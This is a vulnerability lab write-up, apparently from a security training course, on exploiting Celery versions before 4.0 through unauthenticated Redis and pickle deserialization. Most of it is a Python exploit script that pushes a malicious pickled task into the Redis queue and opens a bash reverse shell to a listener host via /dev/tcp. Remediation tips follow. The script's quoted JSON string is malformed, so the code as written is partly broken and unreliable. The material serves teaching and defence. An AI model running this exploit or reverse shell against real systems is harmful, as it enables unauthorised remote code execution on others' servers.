# Celery <4.0 Redis Unauthorized Access + Pickle Deserialization Exploitation

> [中文文档](README.md)

## Vulnerability Overview

`Celery` is a simple, flexible, and reliable distributed system for processing a large number of messages, while providing the tools necessary to maintain such systems. It is a task queue focused on real-time processing and also supports task scheduling.

In `Celery < 4.0` versions, `Pickle` is used by default for serializing task messages. When the queue service (such as Redis, RabbitMQ, RocketMQ, etc.) has an unauthorized access vulnerability, attackers can exploit the `Pickle` deserialization vulnerability to execute arbitrary code.

## Vulnerability Reproduction

Use the exploit script `exploit.py`, which is only compatible with `python3`.

### Reverse Shell

```bash
docker compose logs celery
```

You can see the task message error:

![](https://static.nextcyber.cn/attachments/images/course/task/4a7ad7206b9645e39be6f4fcc23d82d6.png)

You can see that the file `celery_success` was successfully created:

![](https://static.nextcyber.cn/attachments/images/course/task/219b2dc6c2924b1581db778e4f81d47a.png)

### exploit.py

```python
import pickle
import json
import base64
import redis
import sys

r = redis.Redis(host=sys.argv[1], port=6379, decode_responses=True,db=0) 

ori_str="{"content-type": "application/x-python-serialize", "properties": {"delivery_tag": "16f3f59d-003c-4ef4-b1ea-6fa92dee529a", "reply_to": "9edb8565-0b59-3389-944e-a0139180a048", "delivery_mode": 2, "body_encoding": "base64", "delivery_info": {"routing_key": "celery", "priority": 0, "exchange": "celery"}, "correlation_id": "6e046b48-bca4-49a0-bfa7-a92847216999"}, "headers": {}, "content-encoding": "binary", "body": "gAJ9cQAoWAMAAABldGFxAU5YBQAAAGNob3JkcQJOWAQAAABhcmdzcQNLZEvIhnEEWAMAAAB1dGNxBYhYBAAAAHRhc2txBlgJAAAAdGFza3MuYWRkcQdYAgAAAGlkcQhYJAAAADZlMDQ2YjQ4LWJjYTQtNDlhMC1iZmE3LWE5Mjg0NzIxNjk5OXEJWAgAAABlcnJiYWNrc3EKTlgJAAAAdGltZWxpbWl0cQtOToZxDFgGAAAAa3dhcmdzcQ19cQ5YBwAAAHRhc2tzZXRxD05YBwAAAHJldHJpZXNxEEsAWAkAAABjYWxsYmFja3NxEU5YBwAAAGV4cGlyZXNxEk51Lg=="}"

task_dict = json.loads(ori_str)

command = ['bash', '-i', '>&', '/dev/tcp/192.168.2.6/1234', '0>&1']

class Person(object):
    def __reduce__(self):
        # No need to import os module, this is universal
        return (__import__('os').system, (command,))

pickleData = pickle.dumps(Person())
task_dict['body']=base64.b64encode(pickleData).decode()
print(task_dict)

r.lpush('celery',json.dumps(task_dict))
```

## Remediation Suggestions

1. **Redis Unauthorized Access Fix**:
   - Set a Redis password: `requirepass your_password`
   - Bind Redis to a specific IP: `bind 127.0.0.1`
   - Disable dangerous commands: `rename-command FLUSHALL ""`

2. **Celery Security Upgrade**:
   - Upgrade Celery to version 4.0 or higher
   - Version 4.0+ uses JSON serialization by default, which is more secure


---

## Practice

Practice this vulnerability online at [NextCyber Academy](https://app.nextcyber.cn/courses/52).

---

> ⚠️ **Disclaimer**: All content in this directory is for learning and research purposes only. Do not use it for illegal activities.
